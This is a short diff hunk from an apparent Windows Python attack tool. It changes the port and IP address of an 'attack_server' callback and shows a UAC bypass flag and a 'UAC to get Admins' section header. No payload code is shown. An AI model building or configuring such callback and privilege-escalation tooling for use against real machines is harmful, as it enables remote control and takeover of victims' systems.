@@ -4,9 +4,11 @@ import win32com.shell.shell as shell
 
 DEBUG=True
 UAC_BYPASS=False
-port = 9003  #port of attack_server
-host_addr = "127.0.0.1" 
+port = 9004  #port of attack_server
+#host_addr = "127.0.0.1" 
 #host_addr = "175.192.214.36" #address of attack_server
+host_addr = "172.31.103.20" #address of attack_server
+
 
 ### UAC to get Admins
 
